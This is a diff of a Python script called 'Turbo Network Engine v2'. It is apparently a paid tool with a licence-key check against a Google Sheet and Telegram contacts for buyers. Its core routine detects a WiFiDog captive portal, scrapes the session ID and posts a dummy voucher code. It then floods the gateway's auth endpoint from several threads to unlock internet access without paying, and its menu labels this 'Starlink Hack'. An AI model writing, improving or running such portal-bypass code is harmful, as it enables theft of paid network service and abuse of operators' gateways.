@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Turbo Network Engine v2 - Optimized with Google Sheets & Offline Support
+Turbo Network Engine v2 - Complete System
+With Auto Installer & Banner Display
 """
 
 import requests
@@ -22,15 +23,26 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # ===============================
 # COLOR SYSTEM
 # ===============================
-red, bred = "\033[0;31m", "\033[1;31m"
-green, bgreen = "\033[0;32m", "\033[1;32m"
-yellow, byellow = "\033[0;33m", "\033[1;33m"
-cyan, bcyan = "\033[0;36m", "\033[1;36m"
-purple, white, reset = "\033[0;35m", "\033[0;37m", "\033[00m"
+black = "\033[0;30m"
+red = "\033[0;31m"
+bred = "\033[1;31m"
+green = "\033[0;32m"
+bgreen = "\033[1;32m"
+yellow = "\033[0;33m"
+byellow = "\033[1;33m"
+blue = "\033[0;34m"
+bblue = "\033[1;34m"
+purple = "\033[0;35m"
+bpurple = "\033[1;35m"
+cyan = "\033[0;36m"
+bcyan = "\033[1;36m"
+white = "\033[0;37m"
+reset = "\033[00m"
 
 # ===============================
-# CONFIGURATION (Google Sheets)
+# KEY APPROVAL SYSTEM
 # ===============================
+
 SHEET_ID = "1ZpI1hkkkvc1J41qDWvcAREKQCODbS1jXO91lDb8ZqJo"
 SHEET_CSV_URL = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/export?format=csv&gid=0"
 LOCAL_KEYS_FILE = os.path.expanduser("~/.turbo_approved_keys.txt")
@@ -39,146 +51,394 @@ def get_system_key():
     """Get unique system key for this device"""
     try:
         uid = os.geteuid()
-        username = os.environ.get('USER', 'unknown')
-        return f"{uid}{username}"
+    except AttributeError:
+        uid = 1000
+    try:
+        username = os.getlogin()
     except:
-        return "1000unknown"
+        username = os.environ.get('USER', 'unknown')
+    return f"{uid}{username}"
+
+def fetch_authorized_keys():
+    """Fetch authorized keys from Google Sheets"""
+    keys = []
+    
+    try:
+        response = requests.get(SHEET_CSV_URL, timeout=10)
+        if response.status_code == 200:
+            for line in response.text.strip().split('\n'):
+                line = line.strip()
+                if line and not line.startswith('username') and not line.startswith('key'):
+                    key = line.split(',')[0].strip().strip('"')
+                    if key:
+                        keys.append(key)
+            
+            if keys:
+                try:
+                    with open(LOCAL_KEYS_FILE, 'w') as f:
+                        f.write('\n'.join(keys))
+                except:
+                    pass
+            return keys
+    except:
+        pass
+    
+    try:
+        if os.path.exists(LOCAL_KEYS_FILE):
+            with open(LOCAL_KEYS_FILE, 'r') as f:
+                keys = [line.strip() for line in f if line.strip()]
+            return keys
+    except:
+        pass
+    
+    return keys
+
+def check_approval():
+    """Check if system key is approved"""
+    os.system('clear' if os.name == 'posix' else 'cls')
+    print(f"{bcyan}╔══════════════════════════════════════════════════════════════════╗")
+    print(f"║                    KEY APPROVAL SYSTEM                               ║")
+    print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
+    print(f"\n{bcyan}[!] Checking approval status...{reset}")
+    
+    system_key = get_system_key()
+    authorized_keys = fetch_authorized_keys()
+    
+    print(f"{white}[*] System Key: {system_key}{reset}")
+    print(f"{white}[*] Authorized Keys: {len(authorized_keys)}{reset}")
+    
+    if system_key in authorized_keys:
+        print(f"\n{bgreen}╔══════════════════════════════════════════════════════════════════╗")
+        print(f"║                    ✓ KEY APPROVED ✓                                 ║")
+        print(f"║                    Turbo Engine Unlocked                            ║")
+        print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
+        time.sleep(1.5)
+        return True
+    else:
+        print(f"\n{bred}╔══════════════════════════════════════════════════════════════════╗")
+        print(f"║                    ❌ KEY NOT APPROVED ❌                           ║")
+        print(f"╠══════════════════════════════════════════════════════════════════╣")
+        print(f"║                                                                  ║")
+        print(f"║  {yellow}To buy this tool, contact:{reset}                                 ║")
+        print(f"║                                                                  ║")
+        print(f"║     {bcyan}📱 Telegram:{reset}  @Bhone_Pyae_Thu                                      ║")
+        print(f"║     {bcyan}📢 Channel:{reset}  t.me/........                                 ║")
+        print(f"║                                                                  ║")
+        print(f"║  {yellow}Your Key: {system_key}{reset}                                             ║")
+        print(f"║  {yellow}Send this key to buy the tool{reset}                                        ║")
+        print(f"║                                                                  ║")
+        print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
+        return False
+
+# ===============================
+# BANNER DISPLAY (from photo.py)
+# ===============================
+def display_banner():
+    """Display the hacker banner from photo.py"""
+    banner_text = f"""
+{bred}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{reset}
+{bred}┃                                                ┃{reset}
+{bred}┃{bgreen}      ⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen} ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen} ⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen} ⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀ {bred}┃{reset}
+{bred}┃{bgreen} ⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀ {bred}┃{reset}
+{bred}┃{bgreen} ⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀ {bred}┃{reset}
+{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen} ⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀ {bred}┃{reset}
+{bred}┃{bgreen} ⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen}  ⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen}⠀ ⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen}⠀⠀ ⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen}⠀⠀⠀ ⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen}⠀⠀⠀⠀ ⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣠⠴⢋⣾⠟⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen}⠀⠀⠀⠀⠀ ⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
+{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
+{bred}┃                                                ┃{reset}
+{bred}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{reset}
+"""
+    print(banner_text)
+    time.sleep(1.5)
+
+# ===============================
+# AUTO INSTALLER
+# ===============================
+def auto_install_dependencies():
+    """Auto install required dependencies"""
+    required_packages = ['requests', 'urllib3']
+    missing_packages = []
+    
+    print(f"{bcyan}[*] Checking dependencies...{reset}")
+    
+    for package in required_packages:
+        if importlib.util.find_spec(package) is None:
+            missing_packages.append(package)
+    
+    if missing_packages:
+        print(f"{yellow}[!] Missing packages: {', '.join(missing_packages)}{reset}")
+        print(f"{bcyan}[*] Installing dependencies...{reset}")
+        
+        for package in missing_packages:
+            try:
+                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package, '--quiet'])
+                print(f"{green}[✓] Installed: {package}{reset}")
+            except Exception as e:
+                print(f"{red}[X] Failed to install {package}: {e}{reset}")
+        
+        print(f"{green}[✓] All dependencies installed!{reset}")
+        time.sleep(1)
+    else:
+        print(f"{green}[✓] All dependencies already installed!{reset}")
+        time.sleep(0.5)
+
+# ===============================
+# TURBO ENGINE CONFIG
+# ===============================
+PING_THREADS = 5
+MIN_INTERVAL = 0.05
+MAX_INTERVAL = 0.2
+DEBUG = False
+stop_event = threading.Event()
 
 def check_real_internet():
+    """Check if real internet is accessible"""
     try:
         return requests.get("http://www.google.com", timeout=3).status_code == 200
     except:
         return False
 
-def background_verify():
-    """နောက်ကွယ်မှ Key စစ်ဆေးပြီး အောင်မြင်လျှင် Offline သိမ်းဆည်းခြင်း"""
-    my_key = get_system_key()
-    while True:
-        if check_real_internet():
-            try:
-                response = requests.get(SHEET_CSV_URL, timeout=10)
-                if response.status_code == 200 and my_key in response.text:
-                    with open(LOCAL_KEYS_FILE, 'w') as f:
-                        f.write(my_key)
-                    break
-            except:
-                pass
-        time.sleep(15)
-
-def check_approval():
-    """Offline မှတ်ဉာဏ်ရှိမရှိ အရင်စစ်ဆေးခြင်း"""
-    system_key = get_system_key()
-    if os.path.exists(LOCAL_KEYS_FILE):
-        with open(LOCAL_KEYS_FILE, 'r') as f:
-            if f.read().strip() == system_key:
-                return True
-    return False
-
-# ===============================
-# BANNER DISPLAY
-# ===============================
-def display_banner():
-    banner_text = f"""
-{bred}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{reset}
-{bred}┃{bgreen}      ⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀ {bred}┃{reset}
-{bred}┃{bgreen} ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀ {bred}┃{reset}
-{bred}┃{bgreen} ⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧ {bred}┃{reset}
-{bred}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{reset}
-"""
-    print(banner_text)
-
-# ===============================
-# TURBO ENGINE CONFIG
-# ===============================
-PING_THREADS = 8
-stop_event = threading.Event()
-
 def high_speed_ping(auth_link, sid):
+    """High speed ping thread for authentication"""
     session = requests.Session()
+    ping_count = 0
+    success_count = 0
+    
     while not stop_event.is_set():
         try:
-            session.get(auth_link, timeout=5)
-            print(f"{green}[✓]{reset} ENGINE ACTIVE | SID: {sid[:8]} | STATUS: PINGING...", end="\r")
-        except:
-            pass
-        time.sleep(random.uniform(0.05, 0.15))
+            start = time.time()
+            r = session.get(auth_link, timeout=5)
+            elapsed = (time.time() - start) * 1000
+            ping_count += 1
+            success_count += 1
+            
+            if elapsed < 50:
+                color = green
+            elif elapsed < 100:
+                color = yellow
+            else:
+                color = red
+            
+            print(f"{color}[✓]{reset} SID {sid[:8]} | Ping: {elapsed:.1f}ms | Success: {success_count}/{ping_count}", end="\r")
+            
+        except requests.exceptions.Timeout:
+            ping_count += 1
+            print(f"{red}[X]{reset} SID {sid[:8]} | TIMEOUT | Success: {success_count}/{ping_count}", end="\r")
+        except requests.exceptions.ConnectionError:
+            ping_count += 1
+            print(f"{red}[X]{reset} SID {sid[:8]} | Connection Lost | Success: {success_count}/{ping_count}", end="\r")
+        except Exception as e:
+            if DEBUG:
+                print(f"{red}[!]{reset} Error: {e}", end="\r")
+        
+        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))
 
 def start_turbo_engine():
-    os.system('clear')
+    """Main turbo engine process"""
+    os.system('clear' if os.name == 'posix' else 'cls')
     display_banner()
-    print(f"{bcyan}╔════════════════════════════════════════════════╗")
-    print(f"║          TURBO NETWORK ENGINE v2 (PRO)         ║")
-    print(f"╚════════════════════════════════════════════════╝{reset}\n")
+    print(f"{bcyan}╔══════════════════════════════════════════════════════════════════╗")
+    print(f"║                    TURBO NETWORK ENGINE v2                          ║")
+    print(f"║                    Pro Terminal Edition                             ║")
+    print(f"╚══════════════════════════════════════════════════════════════════╝{reset}\n")
     
-    # နောက်ကွယ်မှ Key စစ်ဆေးခြင်းကို စတင်သည်
-    threading.Thread(target=background_verify, daemon=True).start()
+    logging.info(f"{cyan}Initializing Turbo Engine...{reset}")
+    
+    print(f"\n{cyan}[*] Network Status:{reset}")
+    print(f"    Checking internet connectivity...")
+    
+    if check_real_internet():
+        print(f"    {green}[✓] Internet is already active{reset}")
+    
+    print(f"\n{cyan}[*] Starting portal detection...{reset}")
 
     while not stop_event.is_set():
+        session = requests.Session()
+        test_url = "http://connectivitycheck.gstatic.com/generate_204"
+
         try:
-            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
-            if r.url == "http://connectivitycheck.gstatic.com/generate_204" and check_real_internet():
-                print(f"{yellow}[•]{reset} Internet Active... Monitoring    ", end="\r")
-                time.sleep(5)
-                continue
+            r = requests.get(test_url, allow_redirects=True, timeout=5)
+
+            if r.url == test_url:
+                if check_real_internet():
+                    print(f"{yellow}[•]{reset} Internet Already Active... Waiting     ", end="\r")
+                    time.sleep(5)
+                    continue
 
             portal_url = r.url
             parsed_portal = urlparse(portal_url)
-            r2 = requests.get(portal_url, verify=False, timeout=10)
+            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
+
+            print(f"\n{cyan}[*] Captive Portal Detected: {portal_host}{reset}")
+
+            r1 = session.get(portal_url, verify=False, timeout=10)
+            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
+            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
+            r2 = session.get(next_url, verify=False, timeout=10)
+
             sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
-            
+
             if not sid:
-                sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', r2.text)
+                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                 sid = sid_match.group(1) if sid_match else None
 
-            if sid:
-                gw_ip = parsed_portal.netloc.split(':')[0]
-                auth_link = f"http://{gw_ip}:2060/wifidog/auth?token={sid}"
-                print(f"\n{green}[✓] SID Captured: {sid}{reset}")
-                print(f"{purple}[*] Launching Engine Threads...{reset}")
-                for _ in range(PING_THREADS):
-                    threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
+            if not sid:
+                logging.warning(f"{red}Session ID Not Found{reset}")
+                time.sleep(5)
+                continue
+
+            print(f"{green}[✓]{reset} Session ID Captured: {sid}")
+
+            print(f"{cyan}[*] Checking Voucher Endpoint...{reset}")
+            voucher_api = f"{portal_host}/api/auth/voucher/"
+
+            try:
+                v_res = session.post(
+                    voucher_api,
+                    json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1},
+                    timeout=5
+                )
+                print(f"{green}[✓]{reset} Voucher API Status: {v_res.status_code}")
+            except:
+                print(f"{yellow}[!]{reset} Voucher Endpoint Skipped")
+
+            params = parse_qs(parsed_portal.query)
+            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
+            gw_port = params.get('gw_port', ['2060'])[0]
+
+            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
+
+            print(f"{purple}[*] Launching {PING_THREADS} Turbo Threads...{reset}")
+            print(f"{cyan}[*] Target: {gw_addr}:{gw_port}{reset}")
+            print(f"{yellow}[!] Press Ctrl+C to stop{reset}\n")
+
+            threads = []
+            for i in range(PING_THREADS):
+                t = threading.Thread(
+                    target=high_speed_ping,
+                    args=(auth_link, sid),
+                    daemon=True
+                )
+                t.start()
+                threads.append(t)
+
+            last_status = False
+            while not stop_event.is_set():
+                is_connected = check_real_internet()
                 
-                while not stop_event.is_set():
-                    if not check_real_internet(): break
-                    time.sleep(5)
-        except KeyboardInterrupt: raise
-        except: time.sleep(5)
+                if is_connected and not last_status:
+                    print(f"\n{green}[✓] Internet Connected!{reset}")
+                elif not is_connected and last_status:
+                    print(f"\n{red}[X] Internet Disconnected! Reconnecting...{reset}")
+                
+                last_status = is_connected
+                time.sleep(2)
+
+        except KeyboardInterrupt:
+            raise
+        except Exception as e:
+            if DEBUG:
+                logging.error(f"{red}Error: {e}{reset}")
+            time.sleep(5)
+
+# ===============================
+# MENU SYSTEM
+# ===============================
+def show_menu():
+    """Display main menu"""
+    os.system('clear' if os.name == 'posix' else 'cls')
+    display_banner()
+    print(f"""
+{bcyan}╔══════════════════════════════════════════════════════════════════╗
+║                         MAIN MENU                                     ║
+╠══════════════════════════════════════════════════════════════════════╣
+║                                                                      ║
+║     {bgreen}[1]{reset} {cyan}Starlink Hack{reset} - Start Turbo Network Engine                    ║
+║     {bred}[2]{reset} {cyan}Exit{reset} - Close the program                               ║
+║                                                                      ║
+╚══════════════════════════════════════════════════════════════════════╝
+    """)
+    
+    while True:
+        try:
+            choice = input(f"{bcyan}[?]{reset} Select option [1-2]: ").strip()
+            
+            if choice == '1':
+                return 'starlink'
+            elif choice == '2':
+                return 'exit'
+            else:
+                print(f"{red}[!] Invalid option! Please choose 1 or 2{reset}")
+        except KeyboardInterrupt:
+            return 'exit'
+        except Exception as e:
+            print(f"{red}[!] Error: {e}{reset}")
 
 # ===============================
 # MAIN ENTRY POINT
 # ===============================
 def main():
-    os.system('clear')
-    display_banner()
-    my_key = get_system_key()
+    """Main entry point with full flow"""
     
-    # Approved ဖြစ်မဖြစ် စစ်ဆေးခြင်း
-    is_approved = check_approval()
+    # Step 1: Check approval
+    if not check_approval():
+        sys.exit(1)
     
-    print(f"{bcyan}╔════════════════════════════════════════════════╗")
-    print(f"║                   MAIN MENU                    ║")
-    print(f"╚════════════════════════════════════════════════╝{reset}")
-    print(f"[*] YOUR ID: {byellow}{my_key}{reset}")
-    print(f"[*] STATUS: {'{green}APPROVED{reset}' if is_approved else '{red}PENDING VERIFICATION{reset}'}")
+    # Step 2: Auto install dependencies
+    print(f"\n{bcyan}[*] Running auto-installer...{reset}")
+    auto_install_dependencies()
     
-    if not is_approved:
-        print(f"\n{yellow}[!] First Time: Bypass အရင်လုပ်ပါ။ အင်တာနက်ရလျှင် Key အလိုအလျောက် စစ်ပေးပါမည်။{reset}")
-
-    print(f"\n{bgreen}[1]{reset} Start Engine")
-    print(f"{bred}[2]{reset} Exit")
-    
-    choice = input(f"\n{bcyan}[?]{reset} Select: ")
-    if choice == '1':
-        try:
-            start_turbo_engine()
-        except KeyboardInterrupt:
-            print(f"\n{red}Engine Stopped.{reset}")
-    else:
-        sys.exit()
+    # Step 3: Show menu and handle choice
+    while True:
+        choice = show_menu()
+        
+        if choice == 'starlink':
+            try:
+                start_turbo_engine()
+            except KeyboardInterrupt:
+                stop_event.set()
+                print(f"\n{red}Turbo Engine Shutdown...{reset}")
+                print(f"{yellow}Press Enter to return to menu...{reset}")
+                input()
+                continue
+        elif choice == 'exit':
+            print(f"\n{green}[✓] Thank you for using Turbo Network Engine!{reset}")
+            print(f"{cyan}Visit: t.me/Hacker07709 for updates{reset}\n")
+            sys.exit(0)
 
 if __name__ == "__main__":
+    # Check for key display
+    if len(sys.argv) > 1 and sys.argv[1] == "--key":
+        print(f"\n{green}Your System Key: {get_system_key()}{reset}")
+        print(f"{yellow}Send this key to @Bhone_Pyae_Thu to purchase{reset}")
+        sys.exit(0)
+    
+    # Run main program
     try:
         main()
     except KeyboardInterrupt:
+        print(f"\n{red}Program terminated by user{reset}")
         sys.exit(0)
-        
+    except Exception as e:
+        print(f"{red}Fatal Error: {e}{reset}")
+        sys.exit(1)
